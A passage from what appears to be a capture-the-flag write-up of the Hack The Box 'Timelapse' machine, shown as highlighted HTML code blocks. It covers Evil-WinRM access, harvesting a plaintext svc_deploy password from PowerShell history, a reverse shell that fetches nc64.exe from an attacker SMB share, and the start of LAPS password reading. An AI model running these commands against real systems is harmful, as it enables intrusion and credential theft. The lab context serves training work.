<span id="cb12-3"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----------------</span></span>
<span id="cb12-4"></span>
<span id="cb12-5">User Name         SID</span>
<span id="cb12-6"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">============================================</span></span>
<span id="cb12-7">timelapse\legacyy S-1-5-21-671920749-559770252-3318990721-1603</span>
<span id="cb12-8"></span>
<span id="cb12-9"></span>
<span id="cb12-10"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">GROUP</span> INFORMATION</span>
<span id="cb12-11"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-----------------</span></span>
<span id="cb12-12"></span>
<span id="cb12-13"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Group</span> Name                                  <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Type</span>             SID                                          Attributes</span>
<span id="cb12-14"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">===========================================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">============================================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==================================================</span></span>
<span id="cb12-15">Everyone                                    Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-1-0                                      Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb12-16">BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb12-17">BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb12-18">BUILTIN\Pre-Windows <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2000</span> Compatible Access  Alias            S-1-5-32-554                                 Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb12-19">NT AUTHORITY\NETWORK                        Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-5-2                                      Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb12-20">NT AUTHORITY\Authenticated Users            Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-5-11                                     Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb12-21">NT AUTHORITY\This Organization              Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-5-15                                     Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb12-22">TIMELAPSE\Development                       <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Group</span>            S-1-5-21-671920749-559770252-3318990721-3101 Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb12-23">Authentication authority asserted identity  Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-18-1                                     Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb12-24">Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448</span>
<span id="cb12-25"></span>
<span id="cb12-26"></span>
<span id="cb12-27">PRIVILEGES INFORMATION</span>
<span id="cb12-28"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----------------------</span></span>
<span id="cb12-29"></span>
<span id="cb12-30">Privilege Name                Description                    State</span>
<span id="cb12-31"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=============================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==============================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=======</span></span>
<span id="cb12-32">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span>
<span id="cb12-33">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span>
<span id="cb12-34">SeIncreaseWorkingSetPrivilege Increase a <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">process</span> working <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">set</span> Enabled</span></code></pre></div>
<p>We find three new users, <code>Administrator</code>, <code>svc_deploy</code> and <code>TRX</code>.</p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb13-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ls</span></span>
<span id="cb13-2"></span>
<span id="cb13-3"></span>
<span id="cb13-4">    Directory<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users</span>
<span id="cb13-5"></span>
<span id="cb13-6"></span>
<span id="cb13-7">Mode                LastWriteTime         Length Name</span>
<span id="cb13-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----</span>                <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-------------</span>         <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">------</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----</span></span>
<span id="cb13-9">d-----       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">23</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2021</span>  <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">11</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">27</span> AM                Administrator</span>
<span id="cb13-10">d-----       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">25</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2021</span>   <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">8</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">22</span> AM                legacyy</span>
<span id="cb13-11">d-r---       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">23</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2021</span>  <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">11</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">27</span> AM                Public</span>
<span id="cb13-12">d-----       <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">25</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2021</span>  <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">12</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">23</span> PM                svc_deploy</span>
<span id="cb13-13">d-----        <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">23</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2022</span>   <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">5</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">45</span> PM                TRX</span></code></pre></div>
<hr>
</section>
<section id="step-2-1" class="level3">
<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
<p>From the SMB share we found some LAPS documentation, so the privesc probably have something to do with this. Microsoft’s LAPS is a client side extension which runs a single dll that manages password (<code>AdmPwd.dll</code>). The dll is present in <code>C:\Program Files\LAPS\CSE\AdmPwd.dll</code>, download it.</p>
<div class="sourceCode" id="cb14" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb14-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Program Files\LAPS\CSE<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> download <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"C:\Program Files\LAPS\CSE\AdmPwd.dll"</span></span></code></pre></div>
<p>However we are a low privileged user so we can’t poison the dll.. For a quick win check the history and we find a new set of creds: <code>svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV</code> And also got code execution as user <code>svc_deploy</code></p>
<div class="sourceCode" id="cb15" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb15-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">type</span> ConsoleHost_history<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">txt</span></span>
<span id="cb15-2">whoami</span>
<span id="cb15-3">ipconfig <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>all</span>
<span id="cb15-4">netstat <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>ano <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">|</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">select-string</span> LIST</span>
<span id="cb15-5"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$so</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">New-PSSessionOption</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>SkipCACheck <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>SkipCNCheck <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>SkipRevocationCheck</span>
<span id="cb15-6"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$p</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ConvertTo-SecureString</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'E3R$Q62^12p7PLlC%KWaxuaV'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>AsPlainText <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>Force</span>
<span id="cb15-7"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$c</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">New-Object</span> System<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Management</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Automation</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PSCredential</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'svc_deploy'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$p</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb15-8"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">invoke-command</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>computername localhost <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>credential <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$c</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>port <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">5986</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>usessl <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>SessionOption <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$so</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>scriptblock <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span>whoami<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb15-9"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">get-aduser</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>filter <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>properties <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span></span>
<span id="cb15-10"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">exit</span></span></code></pre></div>
<p>Replicate to get a new reverse shell.</p>
<div class="sourceCode" id="cb16" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb16-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\legacyy\Documents<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$so</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">New-PSSessionOption</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>SkipCACheck <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>SkipCNCheck <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>SkipRevocationCheck</span>
<span id="cb16-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\legacyy\Documents<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$p</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ConvertTo-SecureString</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'E3R$Q62^12p7PLlC%KWaxuaV'</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>AsPlainText <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>Force</span>
<span id="cb16-3"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\legacyy\Documents<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$c</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">New-Object</span> System<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Management</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Automation</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PSCredential</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'svc_deploy'</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$p</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb16-4"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\legacyy\Documents<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">invoke-command</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>computername localhost <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>credential <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$c</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>port <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">5986</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>usessl <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>SessionOption <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$so</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>scriptblock <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{</span>whoami<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb16-5">timelapse\svc_deploy</span>
<span id="cb16-6"></span>
<span id="cb16-7">➜  <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>opt impacket-smbserver share <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>smb2support</span>
<span id="cb16-8"></span>
<span id="cb16-9"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\legacyy\Documents<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">invoke-command</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>computername localhost <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>credential <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$c</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>port <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">5986</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>usessl <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>SessionOption <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$so</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>scriptblock <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">{//</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">14.2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>share<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>nc64<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">exe</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">14.2</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4488</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>e powershell<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb16-10"></span>
<span id="cb16-11">➜  timelapse rlwrap nc <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>lvnp <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4488</span>                                                                                    </span>
<span id="cb16-12">listening on <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span>any<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">4488</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">...</span></span>
<span id="cb16-13">connect to <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10.14.2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">from</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>UNKNOWN<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">[</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10.11.152</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">]</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">52197</span></span>
<span id="cb16-14"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">Windows</span> PowerShell </span>
<span id="cb16-15">Copyright <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">(</span>C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">)</span> Microsoft Corporation<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span> All rights reserved<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span></span>
<span id="cb16-16"></span>
<span id="cb16-17"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\svc_deploy\Documents<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> whoami</span>
<span id="cb16-18">timelapse\svc_deploy</span></code></pre></div>
<hr>
</section>
<section id="step-3-1" class="level3">
<h3 class="anchored" data-anchor-id="step-3-1">Step 3</h3>
<p>Enumerating the directories we find <code>laps.ps1</code></p>
<div class="sourceCode" id="cb17" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb17-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\svc_deploy\Desktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">type</span> laps<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ps1</span></span>
<span id="cb17-2"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$Computers</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Get-ADComputer</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>Filter <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>Properties ms-Mcs-AdmPwd<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> ms-Mcs-AdmPwdExpirationTime</span>
<span id="cb17-3"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$Computers</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
